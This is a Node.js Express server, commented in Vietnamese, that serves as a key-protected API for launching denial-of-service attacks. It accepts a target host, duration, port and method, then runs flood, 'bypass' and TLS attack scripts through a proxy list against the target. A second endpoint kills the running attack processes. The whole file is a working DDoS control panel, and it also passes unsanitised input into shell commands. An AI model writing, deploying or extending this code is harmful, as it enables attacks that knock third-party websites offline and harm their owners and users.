const express = require("express");
const { exec } = require("child_process");
const axios = require("axios");

const app = express();
const port = 9999;

let activeAttacks = 0;
const maxConcurrentAttacks = 1;

const getPublicIP = async () => {
  try {
    const { data } = await axios.get('https://api.ipify.org?format=json');
    return data.ip;
  } catch (error) {
    console.error('Không thể lấy IP công cộng:', error);
    return 'N/A';
  }
};

const validateInput = (key, host, time, method, port) => {
  if (![key, host, time, method, port].every(Boolean)) return "Thiếu tham số yêu cầu";
  if (key !== "negan") return "Invalid Key";
  if (time > 300) return "Thời gian phải nhỏ hơn 300 giây";
  if (port < 1 || port > 65535) return "Cổng không hợp lệ";
  if (!["flood", "killer", "bypass", "tlskill", "priv-flood"].includes(method.toLowerCase())) {
    return "Phương thức không hợp lệ";
  }
  return null;
};

const executeAttack = (command, clientIP) => {
  exec(command, (error, stdout, stderr) => {
    if (stderr) console.error(stderr);
    console.log(`[${clientIP}] Lệnh [${command}] đã được thực thi thành công.`);
    activeAttacks--;
  });
};

const pkillProcesses = async () => {
  const processes = ["flood", "killer", "bypass", "tlskill", "priv-flood"];
  let pidList = [];

  // Sử dụng Promise.all để đồng bộ các lệnh exec
  await Promise.all(processes.map((process) => {
    return new Promise((resolve, reject) => {
      const command = `pgrep -f ${process}`; // Lấy PID của các tiến trình có tên process
      exec(command, (error, stdout, stderr) => {
        if (stderr) {
          reject(stderr);
        }

        const pids = stdout.trim().split("\n"); // Lấy các PID và chia thành mảng
        pidList = pidList.concat(pids); // Thêm vào danh sách PID

        console.log(`PID của tiến trình ${process}: ${pids.join(", ")}`);

        // Sau khi lấy các PID, thực hiện lệnh pkill
        const killCommand = `pkill -f -9 ${process}`;
        exec(killCommand, (killError, killStdout, killStderr) => {
          if (killStderr) reject(killStderr);
          console.log(`Đã dừng tiến trình ${process}`);
          resolve();
        });
      });
    });
  }));

  // Trả về danh sách các PID bị dừng sau khi pkill
  return pidList;
};

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port } = req.query;
  const clientIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  const validationMessage = validateInput(key, host, time, method, port);
  if (validationMessage) return res.status(400).json({ status: "error", message: validationMessage });

  if (activeAttacks >= maxConcurrentAttacks) {
    return res.status(400).json({ status: "error", message: "Đã đạt giới hạn tấn công đồng thời" });
  }

  activeAttacks++;
  res.status(200).json({ status: "success", message: "Send Attack Successfully", host, port, time, method });

  // Tạo lệnh tấn công dựa trên phương thức
  let command = "";
  switch (method.toLowerCase()) {
    case "flood":
      command = `node --max-old-space-size=65536 flood ${host} ${time} 10 10 live.txt flood`;
      break;
    case "killer":
      command = `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`;
      break;
    case "bypass":
      command = `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`;
      break;
    case "tlskill":
      command = `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`;
      break;
    case "priv-flood":
      command = `node --max-old-space-size=65536 priv-flood -m GET -u ${host} -s ${time} -p live.txt --ratelimit true --full true`;
      break;
  }

  executeAttack(command, clientIP);
});

app.get("/api/pkill", async (req, res) => {
  const { pkill } = req.query;

  if (pkill === "true") {
    const pidList = await pkillProcesses();
    res.status(200).json({
      status: "success",
      message: "Đã dừng tất cả các tiến trình tấn công.",
      pids: pidList.join(", ") // Trả về danh sách PID của các tiến trình đã dừng
    });
  } else {
    return res.status(400).json({ status: "error", message: "Tham số pkill không hợp lệ." });
  }
});

getPublicIP().then((ip) => {
  app.listen(port, () => {
    console.log(`[Máy chủ API] đang chạy trên > ${ip}:${port}`);
  });
}).catch((err) => {
  console.error("Không thể lấy IP công cộng:", err);
});
